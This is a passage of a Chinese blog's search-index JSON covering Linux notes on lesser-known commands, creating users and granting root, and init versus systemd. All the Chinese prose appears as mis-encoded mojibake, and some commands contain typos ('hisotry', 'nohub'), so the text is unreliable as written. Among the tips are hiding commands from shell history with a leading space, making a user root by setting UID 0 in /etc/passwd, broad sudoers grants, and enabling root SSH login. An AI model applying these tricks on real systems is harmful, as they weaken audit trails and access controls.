å‘½ä»¤ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ç”¨æ¥æ•´ç†é‚£äº›ä¸å¸¸ç”¨ä½†åˆå¾ˆå®ç”¨çš„Linux å‘½ä»¤ã€‚ sudo !!æœ‰æ—¶å€™æˆ‘ä»¬å¥½ä¸å®¹æ˜“è¾“å®Œä¸€é•¿ä¸²å‘½ä»¤ï¼Œå´è¢«æç¤ºâ€æƒé™ä¸è¶³â€ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™æœ‰ä¸€ä¸ªå‘½ä»¤è®°ä½ä¸Šä¸€æ¬¡çš„è¾“å…¥å†…å®¹é‚£è¯¥å¤šå¥½ã€‚ è¿˜çœŸæœ‰ï¼Œ!!å‘½ä»¤å¯ä»¥è·å–æœ€åä¸€æ¬¡è¾“å…¥çš„å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¾“å…¥ä¸‹é¢è¿™ä¸ªå‘½ä»¤å°±å¯ä»¥äº†ã€‚ 1$ sudo !! æ³¨æ„ä¸­é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚ nlnl å‘½ä»¤ç±»ä¼¼catå‘½ä»¤ï¼Œéƒ½æ˜¯æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä½†ä¸åŒä¹‹å¤„åœ¨äºï¼šnlå‘½ä»¤ä¼šåœ¨æ–‡æœ¬å†…å®¹çš„æ¯ä¸€è¡Œå‰é¢ï¼Œæ·»åŠ è¡Œå·ã€‚ 123456$ cat test.txtboomac$ nl test.txt1. boo2. mac treeä»¥æ ‘çŠ¶çš„å½¢å¼è¿”å›å½“å‰ç›®å½•çš„æ–‡ä»¶å¤¹ç»“æ„ï¼Œè¿™ä¸ªå‘½ä»¤å¾ˆå¥½ç”¨ã€‚ 12345$ tree .â””â”€â”€ test.txt0 directories, 1 file pstreeå’Œtreeç±»ä¼¼ï¼Œä¸è¿‡å®ƒæ˜¯è¿”å›å½“å‰è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹åŠå…¶ç›¸å…³çš„å­è¿›ç¨‹çš„æ ‘çŠ¶ç»“æ„ã€‚ 1234$ pstree | grep php|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off; | \\--- 01410 boo nginx: worker process | | \\--- 73098 boo grep --color&#x3D;auto nginx digè¿™ä¸ªå‘½ä»¤ç‰¹åˆ«å®ç”¨ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹åŸŸåè§£ææƒ…å†µã€‚ 123456789101112131415dig 0x2BeAce.com +nostats +nocomments +nocmd; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd;; global options: +cmd;0x2BeAce.com. IN A0x2BeAce.com. 3581 IN A 185.199.108.1530x2BeAce.com. 3581 IN A 185.199.110.1530x2BeAce.com. 3581 IN A 185.199.111.1530x2BeAce.com. 3581 IN A 185.199.109.1530x2BeAce.com. 3581 IN NS ns12.domaincontrol.com.0x2BeAce.com. 3581 IN NS ns11.domaincontrol.com.ns12.domaincontrol.com. 59833 IN A 173.201.73.6ns11.domaincontrol.com. 92984 IN A 97.74.105.6ns12.domaincontrol.com. 146699 IN AAAA 2603:5:2290::6ns11.domaincontrol.com. 92042 IN AAAA 2603:5:2190::6 &lt;ç©ºæ ¼&gt; å‘½ä»¤è¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤ï¼Œæ€»æ‰€å‘¨çŸ¥ï¼Œç”¨æˆ·åœ¨ç»ˆç«¯ä¸Šé”®å…¥çš„æ¯ä¸€ä¸ªå‘½ä»¤éƒ½ä¼šè¢«è®°å½•åˆ°historyä¸­ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªå‘½ä»¤å¯ä»¥éª—è¿‡historyï¼Œè€Œä¸è¢«è®°å…¥å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ åœ¨ç»ˆç«¯ï¼Œåªéœ€è¦åœ¨é”®å…¥å‘½ä»¤ä¹‹å‰è¾“å…¥ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼ï¼Œè¿™æ ·ä½ çš„å‘½ä»¤å°±ä¸ä¼šè¢«è®°å½•äº†ã€‚ 123456$ hisotry8874 pstree | grep nginx$ date2020å¹´ 5æœˆ18æ—¥ æ˜ŸæœŸä¸€ 21æ—¶09åˆ†03ç§’ CST$ history8874 pstree | grep nginx ä¸€äº›å…¶ä»–å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 1$ uname -a æŸ¥æ‰¾å‘è¡Œç‰ˆä¿¡æ¯ 1$ lsb_release -a æŸ¥çœ‹å½“å‰æ—¥æœŸ 1$ date ç«‹å³å…³æœº 1$ shutdown -h now é‡æ–°å¯åŠ¨ 1$ reboot è¾“å‡ºæ–‡ä»¶ç±»å‹ä¿¡æ¯ 12$ file test.txttest.txt: ASCII text åœ¨ç»ˆç«¯ä¸­è¿›è¡Œç®€å•çš„ç®—æ•°è¿ç®— 12$ expr 1 + 34 é‡å‘½åæ–‡ä»¶ 123$ mv fileA.txt fileB.txt$ lsfileB.txt nohup æ˜¯ä¸€ä¸ª POSIX å‘½ä»¤ï¼Œç”¨äºå¿½ç•¥ SIGHUP ã€‚ SIGHUPä¿¡å·æ˜¯çµ‚ç«¯æ³¨é”€æ—¶æ‰€å‘é€è‡³ç¨‹åºçš„ä¸€ä¸ªä¿¡å·ã€‚ 1nohub php script.php type å‘½ä»¤ç”¨æ¥æ˜¾ç¤ºæŒ‡å®šå‘½ä»¤çš„ç±»å‹ï¼Œåˆ¤æ–­ç»™å‡ºçš„æŒ‡ä»¤æ˜¯å†…éƒ¨æŒ‡ä»¤è¿˜æ˜¯å¤–éƒ¨æŒ‡ä»¤ã€‚ 123type -a phpphp is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpphp is &#x2F;usr&#x2F;bin&#x2F;php å‘½ä»¤ç±»å‹ï¼š aliasï¼šåˆ«åã€‚ keywordï¼šå…³é”®å­—ï¼ŒShellä¿ç•™å­—ã€‚ functionï¼šå‡½æ•°ï¼ŒShellå‡½æ•°ã€‚ builtinï¼šå†…å»ºå‘½ä»¤ï¼ŒShellå†…å»ºå‘½ä»¤ã€‚ fileï¼šæ–‡ä»¶ï¼Œç£ç›˜æ–‡ä»¶ï¼Œå¤–éƒ¨å‘½ä»¤ã€‚ unfoundï¼šæ²¡æœ‰æ‰¾åˆ°ã€‚ æŸ¥æ‰¾è¿›ç¨‹ 1ps -aux | grep php æ³¨æ„ï¼šæ¯ä¸ªæ“ä½œç³»ç»Ÿçš„psç‰ˆæœ¬ç•¥æœ‰ä¸åŒï¼ŒUbuntu å’ŒMac ä¸Šå¯ä»¥ç›´æ¥ä½¿ç”¨-auxå‚æ•°ï¼Œä½†å¯èƒ½å…¶ä»–ç³»ç»Ÿä¸èƒ½åŠ ç ´æŠ˜å·ã€‚å‚è€ƒé“¾æ¥ï¼šLinux ps command help and example æ€æ­»è¿›ç¨‹ æ ¹æ® pidï¼ˆä¼šæ€æ­»æŒ‡å®špid çš„è¿›ç¨‹ï¼‰ 1kill -9 [pid] æ ¹æ®è¿›ç¨‹åç§°ï¼ˆä¼šæ€æ­»ä¸€ç»„åŒåè¿›ç¨‹ï¼‰ 1killall php å…¨å±€æ ¹æ®æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶å…·ä½“è·¯å¾„æœ‰æ—¶å€™å¾ˆæƒ³æ‰¾åˆ°æŸä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åˆä¸è®°å¾—å…·ä½“è·¯å¾„äº†ï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨ find å‘½ä»¤ï¼š 1find &#x2F; -name &lt;file name&gt; å‚è€ƒé“¾æ¥ é²œä¸ºäººçŸ¥è€Œåˆå®ç”¨çš„ Linux å‘½ä»¤","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux æ·»åŠ ç”¨æˆ·ä»¥åŠæƒé™åˆ†é…","slug":"linux-add-users-and-assign-permissions","date":"2020-07-15T15:19:14.000Z","updated":"2020-07-16T15:29:23.772Z","comments":true,"path":"linux-add-users-and-assign-permissions/","link":"","permalink":"https://www.0x2beace.com/linux-add-users-and-assign-permissions/","excerpt":"å†™è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ï¼šåœ¨ Linux ä¸‹ç»å¸¸ä¸ºç”¨æˆ·çš„æƒé™é—®é¢˜è€Œå¤´ç–¼ï¼Œè¦ä¹ˆæ˜¯æƒé™ä¸è¶³ï¼Œè¦ä¹ˆæ˜¯æƒé™å¤ªå¤§ï¼Œå¯¼è‡´ç»“æœå¾€å¾€ä¸æ˜¯è‡ªå·±æƒ³è¦çš„ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªä¿ƒä½¿æˆ‘å†™è¿™ç¯‡ç¬”è®°çš„åŸå› å°±æ˜¯ï¼šä¹‹å‰åœ¨ æœ¬åœ°çš„ Ubuntu ä¸Šï¼Œç«Ÿç„¶æŠŠç”¨æˆ·ç©åäº†â€¦ ä¸ºäº†é¿å…è¿™ç§äº‹æƒ…åœ¨æœåŠ¡å™¨ä¸Šå‘ç”Ÿï¼Œè¿˜æ˜¯å¾—æ·±å…¥ç ”ç©¶ä¸‹è¿™ä¸€å—ã€‚","text":"å†™è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ï¼šåœ¨ Linux ä¸‹ç»å¸¸ä¸ºç”¨æˆ·çš„æƒé™é—®é¢˜è€Œå¤´ç–¼ï¼Œè¦ä¹ˆæ˜¯æƒé™ä¸è¶³ï¼Œè¦ä¹ˆæ˜¯æƒé™å¤ªå¤§ï¼Œå¯¼è‡´ç»“æœå¾€å¾€ä¸æ˜¯è‡ªå·±æƒ³è¦çš„ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªä¿ƒä½¿æˆ‘å†™è¿™ç¯‡ç¬”è®°çš„åŸå› å°±æ˜¯ï¼šä¹‹å‰åœ¨ æœ¬åœ°çš„ Ubuntu ä¸Šï¼Œç«Ÿç„¶æŠŠç”¨æˆ·ç©åäº†â€¦ ä¸ºäº†é¿å…è¿™ç§äº‹æƒ…åœ¨æœåŠ¡å™¨ä¸Šå‘ç”Ÿï¼Œè¿˜æ˜¯å¾—æ·±å…¥ç ”ç©¶ä¸‹è¿™ä¸€å—ã€‚ æ·»åŠ ç”¨æˆ·åœ¨ Linux ä¸Šï¼Œæ·»åŠ ç”¨æˆ·æœ‰ä¸¤ç§æ–¹å¼ï¼šuseraddå’Œadduserï¼Œå…¶åŒºåˆ«å°±æ˜¯ï¼š useradd æ˜¯ä¸€ä¸ªLinux å‘½ä»¤ï¼Œå®ƒæä¾›å¾ˆå¤šå‚æ•°ç»™ç”¨æˆ·æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œè®¾ç½®ã€‚ adduser åˆ™æ˜¯ä¸€ä¸ªperl è„šæœ¬ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡ç®€å•çš„äººæœºäº¤äº’ç•Œé¢ï¼Œä¾›ç”¨æˆ·è¿›è¡Œä¸ªæ€§è®¾ç½®ã€‚ adduserç›¸æ¯” useraddï¼Œadduserçš„ä½¿ç”¨è¦ç®€å•å¾ˆå¤šã€‚ ä½¿ç”¨adduser æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼š 1$ adduser boo ç„¶åæ ¹æ®æç¤ºå¡«å†™ç›¸åº”çš„å†…å®¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥å‘½ä»¤ä¼šè‡ªåŠ¨çš„åœ¨ /home ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä¸ç”¨æˆ·åŒåçš„ç›®å½•ã€‚ ç”¨ adduser è¿™ä¸ªå‘½ä»¤åˆ›å»ºçš„è´¦å·æ˜¯ç³»ç»Ÿè´¦å·ï¼Œå¯ä»¥ç”¨æ¥ç™»å½•åˆ° ubuntuç³»ç»Ÿã€‚ useradduseradd å‘½ä»¤æœ‰å¤§é‡çš„å‚æ•°ä¾›æˆ‘ä»¬è¿›è¡Œä¸ªæ€§è®¾ç½®ï¼Œå¸¸ç”¨å‚æ•°å¦‚ä¸‹ï¼š -d&lt;ç™»å…¥ç›®å½•&gt;ï¼šæŒ‡å®šç”¨æˆ·ç™»å…¥æ—¶çš„å¯å§‹ç›®å½•ï¼Œå¹¶èµ‹äºˆç”¨æˆ·å¯¹è¯¥ç›®å½•çš„çš„å®Œå…¨æ§åˆ¶æƒ\u001c -g&lt;ç¾¤ç»„&gt;ï¼šæŒ‡å®šç”¨æˆ·æ‰€å±çš„ç¾¤ç»„ï¼› -G&lt;ç¾¤ç»„&gt;ï¼šæŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ ç¾¤ç»„ï¼› -mï¼šåœ¨ /home ç›®å½•ä¸‹è‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•ï¼› -rï¼šå»ºç«‹ç³»ç»Ÿå¸å·ï¼› -sï¼šæŒ‡å®šç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shellï¼› -uï¼šæŒ‡å®šç”¨æˆ·çš„ id ä½¿ç”¨ useradd åˆ›å»ºç”¨æˆ·çš„ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š 1234$ useradd -m boo -s &#x2F;bin&#x2F;bash$ passwd boo$ ls &#x2F;home&#x2F;boo å…¶ä¸­è¦æ³¨æ„çš„æœ‰ï¼š useradd å‘½ä»¤å¦‚æœä¸å¸¦ä»»ä½•å‚æ•°ï¼ˆuseradd booï¼‰ï¼Œè¡¨ç¤ºåªæ˜¯åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œæ—¢æ²¡æœ‰ /home ç›®å½•ä¸‹çš„åŒåæ–‡ä»¶å¤¹ï¼Œä¹Ÿæ²¡æœ‰è®¾ç½®å¯†ç ï¼Œä½†æ˜¯å¯ä»¥åœ¨ /etc/passwd æ–‡ä»¶çš„æœ€åä¸€è¡Œçœ‹åˆ°åˆšæ‰æ·»åŠ çš„ç”¨æˆ·ã€‚ useradd è¿™ä¸ªå‘½ä»¤åˆ›å»ºçš„æ˜¯æ™®é€šè´¦å·ï¼Œå¹¶ä¸èƒ½ç”¨æ¥ç™»å½•ç³»ç»Ÿã€‚åŠ ä¸Šå‚æ•°-rï¼Œå°†è¯¥ç”¨æˆ·åŠ å…¥åˆ°ç³»ç»Ÿç”¨æˆ·ï¼Œç³»ç»Ÿç”¨æˆ·ä¸º idåœ¨ 1000ä»¥ä¸‹çš„ç”¨æˆ·ï¼Œè€Œæ™®é€šç”¨æˆ·åˆ™æ˜¯id åœ¨ 1000ä»¥ä¸Šã€‚äº‹å®è¯æ˜ æ— è®ºæ˜¯æ™®é€šç”¨æˆ·è¿˜æ˜¯ç³»ç»Ÿç”¨æˆ· åªè¦å¯†ç è¾“å…¥æ­£ç¡®éƒ½èƒ½ç™»å…¥ç³»ç»Ÿã€‚ å½“ä½¿ç”¨å‚æ•°-mçš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åœ°åœ¨ /home ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªä¸æ–°å»ºç”¨æˆ·åŒåçš„ç”¨æˆ·ä¸»æ–‡ä»¶å¤¹ï¼›å¦‚æœä¸ä½¿ç”¨-mçš„è¯ï¼Œé‚£ä¹ˆå°±é»˜è®¤æ˜¯ä½¿ç”¨-Må‚æ•°ï¼Œä¸åˆ›å»ºä¸»æ–‡ä»¶å¤¹ï¼Œå³ä½¿ä½ ä½¿ç”¨äº†-dè¿™ä¸ªå‚æ•°ã€‚æ‰€ä»¥å¦‚æœæƒ³è¦è‡ªå·±é€‰æ‹©ä¸»æ–‡ä»¶å¤¹ï¼Œéœ€è¦åŒæ—¶åŠ ä¸Š-må’Œ-då‚æ•°ã€‚ è¯¯åŒºï¼šå¾ˆéƒ½æ—¶å€™åˆšæ‹¿åˆ°ä¸€å°æ–°çš„æœºå™¨ï¼Œä¼šå‘ç°ç”¨æˆ·ç›®å½•ä¸‹åªæœ‰ä¸€ä¸ªå½“å‰ç”¨æˆ·çš„æ–‡ä»¶å¤¹ï¼Œä¸è¦è¯¯ä»¥ä¸ºè¯¥ç³»ç»Ÿåªæœ‰ä½ ä¸€ä¸ªç”¨æˆ·ï¼Œæ˜¯å› ä¸ºå¾ˆå¤šç³»ç»Ÿç”¨æˆ·çš„ä¸»ç›®å½•å¹¶ä¸åœ¨ /home ä¸‹ã€‚ æƒé™åˆ†é…ææƒæ— è®ºæ˜¯ä½¿ç”¨ adduser è¿˜æ˜¯ useradd åˆ›å»ºçš„ç”¨æˆ·ï¼Œéƒ½è¯•ç€æ‰§è¡Œä¸€ä¸‹ä»¥ä¸‹å‘½ä»¤ï¼š 1$ sudo apt-get install vim ä¸å‡ºæ„å¤–ï¼Œä½ è‚¯å®šä¼šå¾—åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼š 12[sudo] password for boo:boo is not in the sudoers file. This incident will be reported. è¿™ä¸ªé”™è¯¯çš„æ„æ€æ˜¯è¯´è¯¥ç”¨æˆ·å¹¶ä¸åœ¨ sudoers æ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1234567$ sudo visudo# Members of the admin group may gain root privileges%admin ALL&#x3D;(ALL) ALL# æ‰¾åˆ°è¯¥æ³¨é‡Šï¼Œåœ¨å…¶ä¸‹å¢åŠ ä¸€è¡Œ %yourusername ALL&#x3D;(ALL) ALL ç„¶åä¿å­˜é€€å‡ºï¼Œå°±ä¼šå‘ç°å¯ä»¥ä½¿ç”¨ sudo ææƒäº†ã€‚ èµ‹äºˆ root æƒé™è¿™é‡Œæœ‰ä¸‰ç§æ–¹å¼ï¼Œå…ˆæ¥çœ‹çœ‹æœ€ç®€å•çš„æ–¹å¼ï¼š æ–¹å¼ä¸€ï¼š 1234$ sudo vim &#x2F;etc&#x2F;passwd# å°†ç”¨æˆ·id æ”¹ä¸º 0testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh éœ€è¦æ³¨æ„çš„æ˜¯ï¼š è¯¥æ–¹æ³•é€‚ç”¨äºæ™®é€šç”¨æˆ·ä»¥åŠç®¡ç†å‘˜ç”¨æˆ· ä½¿ç”¨ testuser1 è´¦æˆ·ç™»å½•åï¼Œç›´æ¥è·å–çš„å°±æ˜¯ root å¸å·çš„æƒé™ã€‚ æ–¹å¼äºŒï¼šï¼ˆè¿™é‡Œä»¥ubuntu ç³»ç»Ÿä¸ºä¾‹ï¼‰ 1234567$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# Allow members of group sudo to execute any command%sudo ALL&#x3D;(ALL:ALL) ALL# åœ¨å…¶åé¢å¢åŠ ä¸€è¡Œ%wheel ALL&#x3D;(ALL:ALL) ALL ç„¶åä¿®æ”¹è¯¥ç”¨æˆ·ï¼Œä½¿å…¶å±äº root ç»„ï¼ˆwheelï¼‰ï¼š 1$ usermod -g root boo ä¿®æ”¹å®Œæˆä¹‹åï¼Œä½¿ç”¨boo ç”¨æˆ·ç™»å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šsu -ï¼Œè¾“å…¥ root è´¦æˆ·çš„å¯†ç ï¼Œå³å¯è·å¾—root æƒé™ã€‚ æ–¹å¼ä¸‰ï¼šï¼ˆè¿™é‡Œä»¥ubuntu ä¸ºä¾‹ï¼‰ 12345$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# User privilege specificationroot ALL&#x3D;(ALL:ALL) ALLboo ALL&#x3D;(ALL:ALL) ALL ä¿®æ”¹å®Œæˆä¹‹åï¼Œä½¿ç”¨boo ç”¨æˆ·ç™»å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šsu -ï¼Œè¾“å…¥ root è´¦æˆ·çš„å¯†ç ï¼Œå³å¯è·å¾—root æƒé™ã€‚ æ–¹å¼äºŒã€æ–¹å¼ä¸‰å’Œæ–¹å¼ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼šå‰è€…éœ€è¦çŸ¥é“root è´¦æˆ·çš„å¯†ç ï¼Œè€Œåè€…å¯ä»¥ç›´æ¥ä»¥æ™®é€šç”¨æˆ·çš„èº«ä»½æˆ–è€…ç®¡ç†å‘˜èº«ä»½è·å–root æƒé™ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ï¼šä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼è·å– root æƒé™ï¼Œå…¶å®ä¹Ÿæœ‰å¼Šç«¯ï¼Œå¼Šç«¯å°±æ˜¯ è¿œç¨‹ä½¿ç”¨è¯¥ç”¨æˆ·ç™»å…¥æ—¶ï¼Œè¿˜æ˜¯éœ€è¦è¾“å…¥ root å¯†ç ï¼Œæ‰èƒ½éªŒè¯èº«ä»½æˆåŠŸï¼Œæ˜¯çš„ å¿…é¡»è¾“å…¥ root ç”¨æˆ·çš„å¯†ç ã€‚ äº‹å®è¯æ˜ï¼Œå¹¶éä¸Šé¢æ‰€è¿°ï¼Œssh è¿æ¥æ—¶çš„ç¡®éœ€è¦è¾“å…¥å¯†ç éªŒè¯ï¼Œä½†ä¸æ˜¯ root ç”¨æˆ·çš„å¯†ç ï¼Œä¹‹å‰ä¹‹æ‰€ä»¥ä¸€ç›´çœ‹åˆ° Permission denied, please try again.è¿™æ ·çš„é”™è¯¯ï¼Œåªæ˜¯å› ä¸º æ²¡æœ‰å¼€å¯å…è®¸ root ç”¨æˆ·è¿œç¨‹ç™»å…¥çš„æƒé™ã€‚å¦‚ä½•å¼€å¯ï¼Œè§ä¸‹æ–‡æ‰©å±•è¡¥å……ã€‚ æ‰©å±•è¡¥å……åœ¨Ubuntuä¸­å¦‚ä½•ä¿®æ”¹ root å¯†ç é»˜è®¤æƒ…å†µä¸‹ï¼Œå‡ºäºå®‰å…¨åŸå› ï¼Œrootç”¨æˆ·å¸æˆ·å¯†ç åœ¨Ubuntu Linux ä¸­è¢«é”å®šã€‚å› æ­¤ï¼Œæ— æ³•ä½¿ç”¨rootç”¨æˆ·ç™»å½•æˆ–ä½¿ç”¨è¯¸å¦‚su -ä¹‹ç±»çš„å‘½ä»¤æˆä¸ºè¶…çº§ç”¨æˆ·ã€‚ ä½†å¯ä»¥å€ŸåŠ©å…¶ä»–æ–¹å¼ï¼Œä½¿ç”¨passwdå‘½ä»¤æ¥ä¿®æ”¹ã€‚å› ä¸ºæ™®é€šç”¨æˆ·åªèƒ½æ›´æ”¹å…¶å¸æˆ·çš„å¯†ç ã€‚è¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰å¯ä»¥æ›´æ”¹ä»»ä½•ç”¨æˆ·å¸æˆ·çš„å¯†ç ï¼ˆåŒ…æ‹¬å®ƒè‡ªå·±ï¼‰ã€‚ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æˆä¸º rootç”¨æˆ·ï¼š 12$ sudo -i$ passwd root å¦‚æœåœ¨sudo å‘½ä»¤ä½¿ç”¨ä¸äº†çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œå†è¿›è¡Œä¿®æ”¹ 1$ passwd root åœ¨Ubuntuä¸­å¦‚ä½•è¿œç¨‹ root ç™»å…¥åœ¨Ubuntuä¸­ï¼Œé»˜è®¤æ˜¯ä¸èƒ½ä½¿ç”¨ root è´¦æˆ·ç™»å…¥åˆ°ç³»ç»Ÿçš„ï¼Œå¦‚æœä¸€å®šæƒ³è¦ç”¨ rootè´¦æˆ·ç™»å…¥ï¼Œå¯ä»¥ç¼–è¾‘ sshd é…ç½®ï¼Œæ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š 12345678$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# PermitRootLogin prohibit-password# ä¿®æ”¹ä¸ºï¼š# PermitRootLogin yes# é‡å¯sshd æœåŠ¡$ sudo systemctl restart sshd å‚è€ƒé“¾æ¥ adduser å’Œ useradd çš„åŒºåˆ« Ubuntu å¦‚ä½•è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ ssh-å¦‚ä½•è¿œç¨‹ä»¥root ç™»å…¥ å¦‚ä½•åœ¨Ubuntu Linux ä¸­æ›´æ”¹ root å¯†ç  å¦‚ä½•ä½¿ç”¨su / sudoæˆä¸ºUbuntu Linuxçš„è¶…çº§ç”¨æˆ·ï¼Ÿ Ubuntu Linux root ç”¨æˆ·é»˜è®¤å¯†ç ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux initã€serviceã€systemctl ä¸‰è€…åŒºåˆ«","slug":"the-difference-between-linux-init-service-systemctl","date":"2020-07-14T15:38:00.000Z","updated":"2020-12-12T05:46:24.839Z","comments":true,"path":"the-difference-between-linux-init-service-systemctl/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/","excerpt":"åœ¨æ¥è§¦åˆ°Linux çš„æœåŠ¡ä¹‹åï¼Œæˆ‘æ‰€çŸ¥é“çš„ç®¡ç†æœåŠ¡çš„æ–¹å¼æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯initã€serviceã€systemctlã€‚ è‡³äºè¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ä¸å¾—è€ŒçŸ¥ï¼Œæ‰€ä»¥æ•´ç†è¿™ç‰‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£è¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ã€‚","text":"åœ¨æ¥è§¦åˆ°Linux çš„æœåŠ¡ä¹‹åï¼Œæˆ‘æ‰€çŸ¥é“çš„ç®¡ç†æœåŠ¡çš„æ–¹å¼æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯initã€serviceã€systemctlã€‚ è‡³äºè¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ä¸å¾—è€ŒçŸ¥ï¼Œæ‰€ä»¥æ•´ç†è¿™ç‰‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£è¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ã€‚ initå†å²ä¸Šï¼ŒLinux çš„å¯åŠ¨ä¸€ç›´é‡‡ç”¨init è¿›ç¨‹ã€‚ åœ¨ç±»Unix çš„è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­ï¼ŒInitï¼ˆåˆå§‹åŒ–çš„ç®€ç§°ï¼‰æ˜¯åœ¨å¯åŠ¨è®¡ç®—æœºç³»ç»ŸæœŸé—´å¯åŠ¨çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ã€‚ Init æ˜¯ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒå°†æŒç»­è¿è¡Œï¼Œç›´åˆ°ç³»ç»Ÿå…³é—­ã€‚å®ƒæ˜¯æ‰€æœ‰å…¶ä»–è¿›ç¨‹çš„ç›´æ¥æˆ–é—´æ¥çš„çˆ¶è¿›ç¨‹ã€‚ å› ä¸ºinit çš„å‚æ•°å…¨åœ¨/etc/init.dç›®å½•ä¸‹ï¼Œæ‰€ä»¥ä½¿ç”¨ init å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œåº”è¯¥è¿™æ ·åšï¼š 1$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start serviceé€šè¿‡æŸ¥çœ‹man æ‰‹å†Œé¡µå¯ä»¥å¾—çŸ¥ï¼Œserviceæ˜¯ä¸€ä¸ªè¿è¡ŒSystem V initçš„è„šæœ¬å‘½ä»¤ã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯ System V init å‘¢ï¼Ÿ ä¹Ÿå°±æ˜¯/etc/init.d ç›®å½•ä¸‹çš„å‚æ•°ã€‚ æ‰€ä»¥åˆ†æå¯çŸ¥service æ˜¯å»/etc/init.dç›®å½•ä¸‹æ‰§è¡Œç›¸å…³ç¨‹åºï¼ŒæœåŠ¡é…ç½®æ–‡ä»¶çš„å­˜æ”¾ç›®å½•å°±æ˜¯/etc/init.d. ä½¿ç”¨ service å¯åŠ¨ä¸€ä¸ªæœåŠ¡ 1$ service nginx start å¯ä»¥ç†è§£æˆ service å°±æ˜¯init.d 